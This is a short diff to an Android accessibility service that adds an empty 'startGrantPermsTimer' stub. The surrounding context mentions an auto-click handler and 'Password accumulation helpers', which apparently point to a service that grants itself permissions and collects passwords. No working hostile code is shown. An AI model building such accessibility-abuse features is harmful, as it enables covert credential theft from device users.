@@ -788,6 +788,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoClickHandler.post(autoClickRunnable);
     }
 
+    public void startGrantPermsTimer() {
+        // Periodic permission grant — handled by the Activity side.
+    }
+
     // ── Password accumulation helpers ─────────────────────────────────────────
 
     /**
